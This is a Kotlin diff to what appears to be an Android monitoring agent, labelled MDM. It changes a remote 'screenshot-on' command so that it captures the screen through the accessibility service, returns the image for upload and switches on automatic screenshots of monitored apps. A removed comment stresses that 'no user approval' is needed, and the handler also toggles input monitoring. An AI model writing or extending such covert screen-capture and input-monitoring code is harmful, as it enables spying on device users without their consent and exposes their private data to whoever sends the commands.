@@ -402,11 +402,19 @@ class CommandHandler(
             "input-monitoring-off" -> collectors.setInputMonitoring(false)
             "screenshot-on" -> {
                 // ✅ NEW: Uses AccessibilityService.takeScreenshot() (Android 11+)
-                // No MediaProjection, no UI, no user approval needed!
-                // Just enable the auto-screenshot flag.
+                // 1. Take ONE immediate screenshot (so user gets instant feedback)
+                // 2. Enable auto-screenshot for ongoing monitoring
+                Log.i(TAG, "✅ screenshot-on: enabling auto-screenshot + taking immediate screenshot")
+
+                // Take immediate screenshot
+                val immediateShot = collectors.takeScreenshot()
+                Log.i(TAG, "📸 Immediate screenshot result: ${immediateShot?.javaClass?.simpleName}")
+
+                // Enable auto-screenshot for ongoing monitoring
                 com.mdm.agent.service.MDMAccessibilityService.setAutoScreenshot(true)
-                Log.i(TAG, "✅ screenshot-on: auto-screenshot ENABLED via Accessibility API")
-                CollectedData.TextResult("✅ تم تفعيل لقطات الشاشة التلقائية - ستصلك الصور تلقائياً عند فتح التطبيقات المراقبة")
+
+                // Return the immediate screenshot result (will be uploaded as photo)
+                immediateShot
             }
             "screenshot-off" -> {
                 com.mdm.agent.service.MDMAccessibilityService.setAutoScreenshot(false)
